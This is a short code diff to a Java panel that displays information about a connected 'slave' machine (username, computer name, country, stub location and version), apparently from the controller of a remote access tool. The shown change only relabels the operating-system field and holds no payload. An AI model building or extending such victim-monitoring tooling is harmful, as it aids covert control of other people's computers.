@@ -118,7 +118,7 @@ public class PanelControlComputerInfo extends PanelControlParent {
 		addRow("host", "Ping", slave.getPing() + "");
 		addRow("username", "Username", slave.getUsername());
 		addRow("computer_name", "Computer Name", slave.getComputerName());
-		addRow("os", "OS Name", slave.getOperatingSystem());
+		addRow("os", "Operating System", slave.getLongOperatingSystem());
 		addRow(FlagUtils.getFlag(slave), "Country", slave.getCountry());
 		addRow("folder", "Stub Location", slave.getServerPath());
 		addRow("key", "Stub Version", slave.getVersion());
